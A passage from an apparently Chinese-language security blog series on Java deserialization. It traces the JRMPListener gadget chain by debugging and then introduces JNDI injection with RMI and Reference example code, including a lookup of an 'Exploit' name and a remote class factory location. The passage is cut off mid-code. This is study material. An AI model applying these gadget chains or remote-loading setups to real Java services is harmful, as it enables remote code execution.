punctuation">(</span> Class<span class="token operator">&lt;</span>T<span class="token operator">></span> classToInstantiate<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> T<span class="token operator">></span> constructorClass<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span> consArgTypes<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> consArgs <span class="token punctuation">)</span>        <span class="token keyword">throws</span> NoSuchMethodException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> InvocationTargetException <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//获取constructorClass类的构造方法，从泛型限定来看，constructorClass为classToInstantiate的父类</span>    Constructor<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> T<span class="token operator">></span> objCons <span class="token operator">=</span> constructorClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>consArgTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setAccessible</span><span class="token punctuation">(</span>objCons<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置可以访问，可以调用</span>    <span class="token comment" spellcheck="true">//这里会根据constructorClass父类的构造方法新建一个构造方法，但使用该构造方法newInstance出的对象为constructorClass类型</span>    Constructor<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> sc <span class="token operator">=</span> ReflectionFactory<span class="token punctuation">.</span><span class="token function">getReflectionFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newConstructorForSerialization</span><span class="token punctuation">(</span>classToInstantiate<span class="token punctuation">,</span> objCons<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setAccessible</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置可以访问，可以调用</span>    <span class="token comment" spellcheck="true">//调用constructorClass父类的构造方法，将consArgs作为参数，返回constructorClass类型的对象</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>T<span class="token punctuation">)</span>sc<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>consArgs<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>调用链总结如下：</p><pre><code>Gadget chain: * UnicastRemoteObject.readObject(ObjectInputStream) line: 235 * UnicastRemoteObject.reexport() line: 266 * UnicastRemoteObject.exportObject(Remote, int) line: 320 * UnicastRemoteObject.exportObject(Remote, UnicastServerRef) line: 383 * UnicastServerRef.exportObject(Remote, Object, boolean) line: 208 * LiveRef.exportObject(Target) line: 147 * TCPEndpoint.exportObject(Target) line: 411 * TCPTransport.exportObject(Target) line: 249 * TCPTransport.listen() line: 319</code></pre><p>开始动态调试：</p><p>UnicastRemoteObject.readObject：开始执行ActivationGroupImpl父类定义的readObject函数</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/7.png"></div><p>UnicastRemoteObject.reexport</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/8.png"></div><p>UnicastRemoteObject.exportObject(Remote, int)</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/9.png"></div><p>UnicastRemoteObject.exportObject(Remote, UnicastServerRef)</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/10.png"></div><p>UnicastServerRef.exportObject(Remote, Object, boolean)</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/11.png"></div><p>LiveRef.exportObject(Target)这里是LiveRef类中定义的exportObject函数</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/12.png"></div><p>TCPTransport.exportObject(Target)</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/13.png"></div><p>TCPTransport.listen()</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/14.png"></div><p>至此JRMPListener链的学习基本完成</p><h2 id="exploit-JRMPClient学习"><a href="#exploit-JRMPClient学习" class="headerlink" title="exploit/JRMPClient学习"></a>exploit/JRMPClient学习</h2><h1 id="java反序列化入门（五）JNDI注入原理及利用初探"><a href="#java反序列化入门（五）JNDI注入原理及利用初探" class="headerlink" title="java反序列化入门（五）JNDI注入原理及利用初探"></a>java反序列化入门（五）JNDI注入原理及利用初探</h1><h2 id="JNDI介绍"><a href="#JNDI介绍" class="headerlink" title="JNDI介绍"></a>JNDI介绍</h2><p>JNDI全称为Java Naming and Directory Interface，也就是Java命名和目录接口。既然是接口，那么就必定有其实现，而目前我们Java中使用最多的基本就是rmi和ldap的目录服务系统。而命名的意思就是，在一个目录系统，它<strong>实现了把一个服务名称和对象或命名引用相关联，在客户端，我们可以调用目录系统服务，并根据服务名称查询到相关联的对象或命名引用，然后返回给客户端</strong>。而目录的意思就是在命名的基础上，增加了属性的概念，我们可以想象一个文件目录中，每个文件和目录都会存在着一些属性，比如创建时间、读写执行权限等等，并且我们可以通过这些相关属性筛选出相应的文件和目录。而JNDI中的目录服务中的属性大概也与之相似，因此，我们就能在使用服务名称以外，通过一些关联属性查找到对应的对象。</p><p>总结的来说：<strong>JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，我们能通过名称等去找到相关的对象，并把它下载到客户端中来。就是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等。将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象</strong>。</p><p><u><strong>通过name发现和查找数据和对象</strong></u></p><p>代码格式如下：</p><pre class="line-numbers language-java"><code class="language-java">String jndiName<span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//指定需要查找name名称</span>Context context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//初始化默认环境</span>DataSource ds <span class="token operator">=</span><span class="token punctuation">(</span>DataSourse<span class="token punctuation">)</span>context<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>jndiName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//查找该name的数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。（此篇中我们将着重讲解RMI，提到LDAP）<br>RMI格式:</p><pre class="line-numbers language-java"><code class="language-java">InitialContext var1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>DataSource var2 <span class="token operator">=</span> <span class="token punctuation">(</span>DataSource<span class="token punctuation">)</span>var1<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1:1099/Exploit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>JNDI结构<br>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p><pre class="line-numbers language-java"><code class="language-java">javax<span class="token punctuation">.</span>naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>directory：主要用于目录操作，它定义了DirContext接口和InitialDir<span class="token operator">-</span> Context类；javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>event：在命名目录服务器中请求事件通知；javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>ldap：提供LDAP支持；javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RMI介绍"><a href="#RMI介绍" class="headerlink" title="RMI介绍"></a>RMI介绍</h2><h3 id="什么是RMI"><a href="#什么是RMI" class="headerlink" title="什么是RMI"></a>什么是RMI</h3><p>作用是什么：</p><p>RMI，是Remote Method Invocation（远程方法调用）的缩写，即在<strong>一个JVM中java程序调用在另一个远程JVM中运行的java程序</strong>，这个远程JVM既可以在同一台实体机上，也可以在不同的实体机上，两者之间通过网络进行通信。java RMI封装了远程调用的实现细节，进行简单的配置之后，就可以如同<strong>调用本地方法一样，比较透明地调用远端方法</strong>。</p><h3 id="RMI三部分"><a href="#RMI三部分" class="headerlink" title="RMI三部分"></a>RMI三部分</h3><p>RMI有三部分：</p><p>1.<strong>Registry</strong>: 提供服务注册与服务获取。<strong>即Server端向Registry注册服务，比如地址、端口等一些信息，Client端从Registry获取远程对象的一些信息，如地址、端口等，然后进行远程调用</strong>。<br>2.<strong>Server</strong>: 远程方法的提供者，并向Registry注册自身提供的服务。<br>3.<strong>Client</strong>: 远程方法的消费者，从Registry获取远程方法的相关信息并且调用。</p><h3 id="RMI使用"><a href="#RMI使用" class="headerlink" title="RMI使用"></a>RMI使用</h3><p>从头开始写一个简单的RMI示例，实现输入名字，返回“Hello, XXX”的工程。创建一个完整的远程调用，我们分为以下几步：</p><ol><li>定义一个远程接口，这个接口需要继承Remote，并且接口中的每一个方法都需要抛出RemoteException异常</li><li>开发远程接口的实现类</li><li>Registry的创建</li><li>RMI Server的创建</li><li>RMI Client的创建</li></ol><p>定义一个远程接口：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>luckyqiao<span class="token punctuation">.</span>rmi<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>Remote<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">RemoteHello</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">{</span>    String <span class="token function">sayHello</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开发远程接口实现类：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>luckyqiao<span class="token punctuation">.</span>rmi<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RemoteHelloImpl</span>  <span class="token keyword">implements</span> <span class="token class-name">RemoteHello</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String <span class="token function">sayHello</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException <span class="token punctuation">{</span>        <span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Hello, %s!"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Registry 的创建</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>luckyqiao<span class="token punctuation">.</span>rmi<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>CountDownLatch<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RegistryServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException<span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Registry使用8000端口</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RemoteException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        CountDownLatch latch<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CountDownLatch</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        latch<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//挂起主线程，否则应用会退出</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>RMI server的创建</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>luckyqiao<span class="token punctuation">.</span>rmi<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>AlreadyBoundException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span>UnicastRemoteObject<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        RemoteHello remoteHello <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RemoteHelloImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            RemoteHello stub <span class="token operator">=</span> <span class="token punctuation">(</span>RemoteHello<span class="token punctuation">)</span> UnicastRemoteObject<span class="token punctuation">.</span><span class="token function">exportObject</span><span class="token punctuation">(</span>remoteHello<span class="token punctuation">,</span> <span class="token number">4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//导出服务，使用4000端口</span>            Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取Registry</span>            registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">,</span> stub<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//使用名字hello，将服务注册到Registry</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">AlreadyBoundException</span> <span class="token operator">|</span> IOException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>RMI client的创建</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>luckyqiao<span class="token punctuation">.</span>study<span class="token punctuation">.</span>rmi<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>NotBoundException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取注册中心引用</span>            RemoteHello remoteHello <span class="token operator">=</span> <span class="token punctuation">(</span>RemoteHello<span class="token punctuation">)</span> registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取RemoteHello服务</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>remoteHello<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"World"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//调用远程方法</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RemoteException</span> <span class="token operator">|</span> NotBoundException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="进一步了解JNDI"><a href="#进一步了解JNDI" class="headerlink" title="进一步了解JNDI"></a>进一步了解JNDI</h2><h3 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h3><p>构造方法：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token function">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 构建一个初始上下文。  <span class="token function">InitialContext</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> lazy<span class="token punctuation">)</span> 构造一个初始上下文，并选择不初始化它。  <span class="token function">InitialContext</span><span class="token punctuation">(</span>Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span> 使用提供的环境构建初始上下文。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码：</p><pre class="line-numbers language-java"><code class="language-java">InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。</p><p>常用的方法：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token function">bind</span><span class="token punctuation">(</span>Name name<span class="token punctuation">,</span> Object obj<span class="token punctuation">)</span>     将名称绑定到对象。 <span class="token function">list</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span>     枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。<span class="token function">lookup</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span>     检索命名对象。 <span class="token function">rebind</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> Object obj<span class="token punctuation">)</span>     将名称绑定到对象，覆盖任何现有绑定。 <span class="token function">unbind</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span>     取消绑定命名对象。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>demo<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>NamingException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">jndi</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>        String uri <span class="token operator">=</span> <span class="token string">"rmi://127.0.0.1:1099/work"</span><span class="token punctuation">;</span>        InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h3><p>该类也是在javax.naming的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。</p><p>构造方法</p><pre class="line-numbers language-java"><code class="language-java"><span class="token function">Reference</span><span class="token punctuation">(</span>String className<span class="token punctuation">)</span>     为类名为“className”的对象构造一个新的引用。  <span class="token function">Reference</span><span class="token punctuation">(</span>String className<span class="token punctuation">,</span> RefAddr addr<span class="token punctuation">)</span>     为类名为“className”的对象和地址构造一个新引用。  <span class="token function">Reference</span><span class="token punctuation">(</span>String className<span class="token punctuation">,</span> RefAddr addr<span class="token punctuation">,</span> String factory<span class="token punctuation">,</span> String factoryLocation<span class="token punctuation">)</span>     为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。  <span class="token function">Reference</span><span class="token punctuation">(</span>String className<span class="token punctuation">,</span> String factory<span class="token punctuation">,</span> String factoryLocation<span class="token punctuation">)</span>     为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码：</p><pre class="line-numbers language-java"><code class="language-java">String url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080"</span><span class="token punctuation">;</span>Reference reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>参数1：className – 远程加载时所使用的类名</p><p>参数2：classFactory – 加载的class中需要实例化类的名称</p><p>参数3：classFactoryLocation – 提供classes数据的地址可以是file/ftp/http协议</p><p>常用方法：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> posn<span class="token punctuation">,</span> RefAddr addr<span class="token punctuation">)</span>     将地址添加到索引posn的地址列表中。  <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span>RefAddr addr<span class="token punctuation">)</span>     将地址添加到地址列表的末尾。  <span class="token keyword">void</span> <span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     从此引用中删除所有地址。  RefAddr <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> posn<span class="token punctuation">)</span>     检索索引posn上的地址。  RefAddr <span class="token function">get</span><span class="token punctuation">(</span>String addrType<span class="token punctuation">)</span>     检索地址类型为“addrType”的第一个地址。  Enumeration<span class="token operator">&lt;</span>RefAddr<span class="token operator">></span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     检索本参考文献中地址的列举。  String <span class="token function">getClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     检索引用引用的对象的类名。  String <span class="token function">getFactoryClassLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     检索此引用引用的对象的工厂位置。  String <span class="token function">getFactoryClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     检索此引用引用对象的工厂的类名。    Object <span class="token function">remove</span><span class="token punctuation">(</span><span class="token keyword">int</span> posn<span class="token punctuation">)</span>     从地址列表中删除索引posn上的地址。  <span class="token keyword">int</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     检索此引用中的地址数。  String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     生成此引用的字符串表示形式。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>demo<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>NamingException<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Reference<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>AlreadyBoundException<span class="token punctuation">;</span><span class="token 